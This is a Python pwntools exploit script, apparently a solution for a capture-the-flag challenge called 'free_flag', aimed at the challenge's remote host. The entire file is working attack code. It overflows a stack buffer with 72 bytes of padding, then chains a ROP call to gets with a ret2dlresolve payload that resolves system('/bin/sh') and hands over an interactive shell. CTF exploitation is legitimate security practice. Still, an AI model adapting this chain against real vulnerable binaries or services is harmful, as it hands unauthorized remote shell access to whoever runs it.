from pwn import *

exe = ELF("./free_flag_patched")

context.binary = exe

HOST = "free_flag.chall.bytethecookies.org"
PORT = 5160

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
# args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

dlresolve = Ret2dlresolvePayload(exe, symbol="system", args=["/bin/sh"])

def call_gets(r):
    rop = ROP(exe)
    
    rop.call("gets", [dlresolve.data_addr])
    rop.raw(rop.ret.address)
    rop.ret2dlresolve(dlresolve)

    r.sendline(b"a" * 72 + rop.chain())

def ret2dlresolve(r):
    r.sendline(dlresolve.payload)

def main():
    r = conn()

    call_gets(r)
    ret2dlresolve(r)

    r.interactive()

if __name__ == "__main__":
    main()
